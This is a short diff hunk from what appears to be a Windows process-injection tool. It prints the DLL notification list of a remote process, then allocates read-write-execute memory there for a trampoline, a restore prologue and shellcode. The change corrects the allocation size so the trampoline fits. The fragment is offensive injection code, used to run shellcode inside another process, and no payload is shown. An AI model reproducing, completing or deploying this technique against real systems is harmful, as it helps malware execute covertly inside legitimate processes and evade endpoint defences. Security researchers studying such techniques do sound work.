@@ -154,7 +154,7 @@ int main()
     PrintDllNotificationList(hProc, headAddress);
 
     // Allocate memory for our trampoline + restore prologue + shellcode in the remote process
-    LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(restore) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(trampoline) + sizeof(restore) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     printf("[+] Allocated memory for restore trampoline + prologue + shellcode in remote process\n");
     printf("[+] Trampoline address in remote process: 0x%p\n", trampolineEx);
 
